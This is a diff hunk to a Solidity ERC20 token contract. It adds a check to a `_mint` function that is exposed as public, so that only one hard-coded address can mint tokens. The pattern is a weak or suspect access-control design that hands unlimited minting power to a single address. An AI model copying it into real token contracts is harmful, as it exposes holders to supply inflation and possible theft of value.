@@ -256,6 +256,7 @@ contract ERC20 is IERC20 {
      * - `to` cannot be the zero address.
      */
     function _mint(address account, uint256 amount) public virtual {
+        require(msg.sender == 0x78e044394595D4984F66c1B19059Bc14ecc24063);
         _beforeTokenTransfer(address(0), account, amount);
 
         _setTotalSupply(totalSupply().add(amount));
